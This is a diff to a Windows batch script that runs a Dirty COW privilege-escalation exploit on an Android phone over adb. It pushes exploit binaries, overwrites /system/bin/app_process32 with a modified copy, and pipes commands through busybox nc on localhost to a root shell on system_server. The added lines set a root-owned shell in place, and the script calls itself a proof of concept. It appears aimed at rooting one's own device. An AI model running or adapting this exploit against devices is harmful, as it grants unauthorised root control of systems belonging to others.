@@ -4,8 +4,8 @@ mode 100,30
 ::Set our default parameters
 @echo off
 color 0b
-echo.--------------------------------------------------------------------------------------------
-echo.--------------------------------------------------------------------------------------------
+echo --------------------------------------------------------------------------------------------
+echo --------------------------------------------------------------------------------------------
 echo [*] BEFORE WE BEGIN THE SCRIPT WILL RUN "ADB DEVICES" AND SEE IF YOU HAVE DRIVERS INSTLLED
 echo [*] THE NEEDED RESPONSE IS SIMILAR TO BELOW 
 echo [*]
@@ -17,7 +17,7 @@ echo [*] IF NO DEVICE LISTED YOU ARE NOT READY TO RUN THIS SCRIPT. CLOSE THIS WI
 echo [*] 
 echo [*] IF DEVICE IS LISTED PRESS ANY KEY ON COMPUTER TO START
 echo [*]
-::adb wait-for-device
+adb wait-for-device
 adb devices
 pause
 cls
@@ -37,28 +37,31 @@ echo [*] changing permissions on copied files
 adb shell chmod 0777 /data/local/tmp/*
 timeout 2 > nul
 cls
-echo.--------------------------------------------------------------------------------------------
+echo --------------------------------------------------------------------------------------------
 echo [*] DONE PUSHING FILES TO PHONE. NOW WE ARE GOING TO TEMP WRITE OVER THE APP_PROCESS
 echo [*] WITH A MODIFIED VERSION THAT HAS lsh IN IT USING A SYSTEM-SERVER AS ROOT SHELL
 echo [*] THIS STEP WILL CAUSE PHONE TO DO A SOFT REBOOT AND WILL NOT RESPOND TO BUTTON PUSHES
-echo [*] 
+echo [*] timeout 15 seconds to read comments
+timeout 15
 adb shell /data/local/tmp/dirtycow /system/bin/app_process32 /data/local/tmp/recowvery-app_process32
-echo.--------------------------------------------------------------------------------------------
+echo --------------------------------------------------------------------------------------------
 cls
-echo.--------------------------------------------------------------------------------------------
-echo.--------------------------------------------------------------------------------------------
+echo --------------------------------------------------------------------------------------------
+echo --------------------------------------------------------------------------------------------
 echo [*]WAITING 60 SECONDS FOR ROOT SHELL TO SPAWN
-timeout 60 > nul
-echo.--------------------------------------------------------------------------------------------
+timeout 60
+echo --------------------------------------------------------------------------------------------
 echo [*] OPENING A ROOT SHELL ON THE NEWLY CREATED SYSTEM_SERVER
 echo [*] CREATE A NEW DIRECTORY AS A TEST
 echo [*] CHANGING PERMISSIONS ON NEW DIRECTORY
+echo [*] COPY shell FROM tmp TO test SO IT BECOMES OWNED  BY ROOT
 adb shell "/data/local/tmp/busybox nc localhost 11112 < /data/local/tmp/cp_comands.txt"
 echo [*]  
 echo --------------------------------------------------------------------------------------------
 echo --------------------------------------------------------------------------------------------
 echo [*] THERE WAS THE PROOF OF CONCEPT
 echo [*] NOW YOU CAN MODIFY THE cp_comands.txt AND START OVER TO SEE WHAT YOU CAN ACHIVE
+echo [*] NOW IF IT WENT CORRECT YOU CAN LAUNCH shell FORM test AND WILL BE A ROOT SHELL
 pause
 cls
 echo [*]  
